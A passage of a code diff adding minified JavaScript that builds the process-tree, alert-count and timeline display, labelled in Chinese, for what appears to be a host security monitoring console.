+          const seen = {}; return cs.map((c2) => { if (c2.length === 1) { const o = ptOf(id, c2[0]); if (seen[c2[0][2]] || cs.length > 4) o.n = cs.length > 4 && !seen[c2[0][2]] && c2 === cs[0] ? o.n : ''; seen[c2[0][2]] = 1; return o; } seen[c2[0][2]] = 1; const ta = tsec(c2[0][1]), tb = tsec(c2[c2.length - 1][1]); return { n: '×' + c2.length, tt: c2[0][1] + ' – ' + c2[c2.length - 1][1] + ' · ' + c2[0][2] + ' ×' + c2.length, st: 'left:' + L((ta + tb) / 2), c: 'hg-pt ' + CC + ' cl', he: HV('a:' + c2[0][0]), t: ev(() => S({ huN: id })) }; }); };
+        const rowOf2 = (id, extra) => { const d = ND(id); const al = alOf(id); const ts = al.map((y) => tsec(y[1]));
+          const bar = ts.length > 0; const b0 = bar ? Math.min.apply(null, ts) : 0; const b1 = d[0] === 'proc' && bar && live ? T1 : bar ? Math.max.apply(null, ts) : 0;
+          return { n: d[1], s: d[0] === 'proc' ? d[2].replace('PID ', '') : d[2], ic: 'hg-mk sm ' + ICG[d[0]], c: 'hg-row' + (id === selN ? ' on' : '') + (VM[id] && fd(id) ? ' fd' : '') + (al.length ? '' : ' mu') + (extra || ''), t: sel(id),
+            bar: bar && b1 > b0, bc: 'hg-bar ' + CC, bst: 'left:' + L(b0) + ';width:calc(' + L(b1) + ' - ' + L(b0) + ')', pts: stOfP(id).concat(cluA(id, al)) }; };
+        const tro = (st.hgRo || {})[exK] || {}; const ent = []; const byNm = {};
+        V.forEach((o) => { if (o.t === 'f') return; (o.t === 'g' ? o.m : [o.id]).forEach((id) => { const key = PRC[id] ? 'p:' + PRC[id][0] : 'n:' + id; if (!byNm[key]) { byNm[key] = { nm: PRC[id] ? PRC[id][0] : '', ids: [], gid: '' }; ent.push(byNm[key]); } byNm[key].ids.push(id); if (o.t === 'g') byNm[key].gid = o.id; }); });
+        ls.hg.rows = [];
+        ent.forEach((g) => { if (g.ids.length === 1) { ls.hg.rows.push(rowOf2(g.ids[0])); return; }
+          const op = !!tro[g.nm] || (!!gs && gs === g.gid); const hot = g.ids.filter((x2) => alOf(x2).length); const pts = []; if (!op) g.ids.forEach((x2) => { if (hot.indexOf(x2) < 0) stOfP(x2).forEach((q2) => pts.push(q2)); });
+          ls.hg.rows.push({ n: g.nm + ' ×' + g.ids.length, s: op ? '收起' : '展开', ic: 'hg-mk sm proc', c: 'hg-row grp' + (op ? ' on' : ''),
+            t: ev(() => S({ hgRo: Object.assign({}, st.hgRo || {}, { [exK]: Object.assign({}, tro, { [g.nm]: !op }) }), hgGs: op ? '' : gs })), bar: false, bc: '', bst: '', pts });
+          (op ? g.ids : hot).forEach((x2) => ls.hg.rows.push(rowOf2(x2, ' sub'))); });
+        /* 进程树 = 缩进列表 + 时间列 */
+        ls.hg.isT = isTree; ls.hg.notT = !isTree; ls.hg.trs = [];
+        ls.hg.ta0 = a0; ls.hg.ta1 = a1; ls.hg.trOn = !!TR; ls.hg.trN = TR ? fmt(a0) + ' – ' + fmt(a1) : ''; ls.hg.trR = ev(() => S({ hgTr: Object.assign({}, st.hgTr || {}, { [incId]: null }) }));
+        this._hgTrSet = ls.hg.trSet = (t0, t1) => this.setState({ hgTr: Object.assign({}, st.hgTr || {}, { [incId]: [t0, t1] }) });
+        if (isTree) { const co = (st.hgCo || {})[exK] || {}; const go = (st.hgGo || {})[exK] || {}; const depO = {};
+          const dep = (id) => depO[id] !== undefined ? depO[id] : (depO[id] = VM[id].par ? dep(VM[id].par) + 1 : 0);
+          const hidA = (id) => { let p = VM[id].par; while (p) { if (co[p]) return true; p = VM[p].par; } return false; };
+          const stp = (k, id) => (e) => { if (e) { e.stopPropagation(); e.preventDefault(); } const m0 = k === 'co' ? co : go; S({ [k === 'co' ? 'hgCo' : 'hgGo']: Object.assign({}, st[k === 'co' ? 'hgCo' : 'hgGo'] || {}, { [exK]: Object.assign({}, m0, { [id]: !m0[id] }) }) }); };
+          const inR = (t) => t >= a0 && t <= a1;
+          const CL = (a1 - a0) * (fs ? 0.014 : 0.03); const clamp = (t) => Math.max(a0, Math.min(a1, t));
+          const tk = (ids2) => { const pts = []; const S2 = []; const A2 = []; let t0 = Infinity, t1 = -Infinity;
+            ids2.forEach((x2) => { const p = PRC[x2]; if (p && p[7]) { const t = tsec(p[7]); t0 = Math.min(t0, t); t1 = Math.max(t1, t); if (inR(t)) S2.push([t, x2]); } alOf(x2).forEach((y) => { const t = tsec(y[1]); t0 = Math.min(t0, t); t1 = Math.max(t1, t); if (inR(t)) A2.push([t, x2, y]); }); });
+            S2.sort((p1, p2) => p1[0] - p2[0]); let lastS = -Infinity; S2.forEach(([t, x2]) => { if (t - lastS < CL) return; lastS = t; const p = PRC[x2]; pts.push({ n: '', tt: p[7] + ' · ' + p[0] + ' 启动（PID ' + p[1] + '）', st: 'left:' + L(t), c: 'hg-pt s', he: () => {}, t: ev(() => S({ huN: x2 })) }); });
+            A2.sort((p1, p2) => p1[0] - p2[0]); const cls = []; A2.forEach((q2) => { const c2 = cls[cls.length - 1]; if (c2 && q2[0] - c2[c2.length - 1][0] < CL) c2.push(q2); else cls.push([q2]); });
+            cls.forEach((c2) => { if (c2.length === 1) { pts.push(ptOf(c2[0][1], c2[0][2])); return; } const ta = c2[0][0], tb = c2[c2.length - 1][0]; const nm2 = c2[0][2][2];
+              pts.push({ n: '×' + c2.length, tt: c2[0][2][1] + ' – ' + c2[c2.length - 1][2][1] + ' · ' + nm2 + (c2.every((q3) => q3[2][2] === nm2) ? '' : ' 等') + ' ×' + c2.length + '，点击放大这段时间', st: 'left:' + L((ta + tb) / 2), c: 'hg-pt ' + CC + ' cl', he: HV('a:' + c2[0][2][0]),
+                t: ev(() => { const w = Math.max(tb - ta, 60); S({ hgTr: Object.assign({}, st.hgTr || {}, { [incId]: [ta - w * 0.25, tb + w * 0.25] }) }); }) }); });
+            const v0 = clamp(t0), v1 = clamp(t1); return { pts, ln: t1 > t0 && v1 > v0, lst: 'left:' + L(v0) + ';width:calc(' + L(v1) + ' - ' + L(v0) + ')' }; };
+          const chip = (k) => k ? { chip: k + ' 条告警', chipC: 'hg-chip ' + CC } : { chip: '', chipC: '' };
+          const row = (o) => Object.assign({ dpb: '', tw: false, twc: '', twT: () => {}, twL: '', cmd: '', pid: '', ic: 'hg-mk sm proc', he: () => {}, chip: '', chipC: '', pts: [], ln: false, lst: '' }, o);
+          const push = (r) => ls.hg.trs.push(row(r));
+          V.forEach((o) => { const id = o.id; if (hidA(id)) return; const d = dep(id); const ind = '--d:' + Math.min(d, 6); const dpb = d >= 6 ? 'L' + (d + 1) : '';
+            const mq = act ? (mtO(o) ? ' mt' + (id === curM ? ' cur' : '') : ' dm') : '';
+            if (o.t === 'f') { const nm = o.names ? o.names.filter((v2, i2, a2) => a2.indexOf(v2) === i2) : [];
+              push({ id, dpb, n: o.close ? '收起 ' + o.n + ' 个无告警进程' : '+' + o.n + ' 个无告警进程', cmd: o.close ? '' : nm.slice(0, 4).join('、') + (nm.length > 4 ? ' 等' : ''), ic: 'hg-mk sm more', c: 'hgt-r fold' + mq, ind,
+                t: ev(() => S({ hgEx: Object.assign({}, st.hgEx || {}, { [exK]: Object.assign({}, exM, { [o.fp]: !o.close }) }) })) }); return; }
+            if (o.t === 'g') { const m = o.m; const op = !!go[id]; const pids = m.map((x2) => PRC[x2][1]); const ak = m.reduce((a2, x2) => a2 + alOf(x2).length, 0); const rep = m.find((x2) => alOf(x2).length) || m[0];
+              push(Object.assign({ id, dpb, ttl: o.nm + ' ×' + m.length, n: o.nm + ' ×' + m.length, pid: 'PID ' + Math.min.apply(null, pids) + '–' + Math.max.apply(null, pids), cmd: PRC[m[0]][4], c: 'hgt-r grp' + (m.indexOf(selN) >= 0 && !op ? ' on' : '') + mq, ind,
+                tw: true, twc: 'hgt-tw' + (op ? ' op' : ''), twT: stp('go', id), twL: op ? '收起' : '展开 ' + m.length + ' 个进程', t: stp('go', id), he: HV('n:' + rep) }, chip(ak), tk(m)));
+              if (op) m.forEach((x2) => { const p = PRC[x2]; push(Object.assign({ id: x2, n: p[0], pid: 'PID ' + p[1], cmd: p[4], c: 'hgt-r sub' + (x2 === selN ? ' on' : '') + (act ? (mOne(x2) ? ' mt' : ' dm') : ''), ind: '--d:' + Math.min(d + 1, 6), t: sel(x2), he: HV('n:' + x2) }, chip(alOf(x2).length), tk([x2]))); });
+              return; }
+            const p = PRC[id]; const hk = (kids[id] || []).length > 0; const cl = !!co[id];
+            push(Object.assign({ id, dpb, ttl: p[0] + '  PID ' + p[1], n: p[0], pid: 'PID ' + p[1], cmd: p[4], c: 'hgt-r' + (id === selN ? ' on' : '') + (alOf(id).length ? ' hot' : '') + mq, ind, t: sel(id), he: HV('n:' + id),
+              tw: hk, twc: 'hgt-tw' + (cl ? '' : ' op'), twT: stp('co', id), twL: cl ? '展开子进程' : '收起子进程' }, chip(alOf(id).length), tk([id]))); }); }
+        ls.hg.planO = (e) => { this.setState({ hgFs: false }); if (ls.planO) ls.planO(e); };
+        ls.vtabs.forEach((t) => { t.sc = t.on ? 'on' : ''; });
+        ls.nx.forEach((x) => { x.dc = 'hg-act' + (x.c ? ' in' : ''); });
+      }
       return out;
     }
     if (PGN === 'SecHostDetail') {
